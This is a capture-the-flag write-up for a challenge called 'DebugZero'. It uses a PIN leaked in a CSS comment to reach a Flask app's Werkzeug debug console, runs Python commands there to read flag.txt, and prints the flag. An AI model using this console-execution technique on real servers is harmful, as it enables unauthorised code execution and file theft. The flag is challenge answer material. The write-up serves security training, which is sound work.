# DebugZero

## Description

Someone on the dev team fat fingered their keyboard, and deployed the wrong app to production. Try and find what went wrong. The flag is in a file called "flag.txt"

## Solution

Website: **This website is currently under  _development_**

Taking a look at source code:

```html
<!-- John, please don't run the app in debug mode, how many times do I have to tell you this! -->
```

There's no interesting links to go to, nor does `robots.txt` exist... What's this local file `static/styles.css`?

```css
/* Nothing interesting here except this number - 934123 */
```

0w0 Pin number? and debug mode is on?

If you have worked with flask applications this must be familiar to you.<br>
HackTricks also has information about [Flask Debug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal)

Navigate to `/console`:

```py
[console ready]
>>> import os
>>> os.listdir()
['.dockerignore', '.gitignore', 'Dockerfile', 'app.py', 'flag.txt', 'requirements.txt', 'static', 'templates']
>>> os.system('cat flag.txt')
0 # Doesnt Work...
>>> import subprocess
>>> subprocess.check_output(["cat", "flag.txt"])
b'dsc{p1zz4_15_4w350m3}\n'
```
::: tip Flag
`dsc{p1zz4_15_4w350m3}`
:::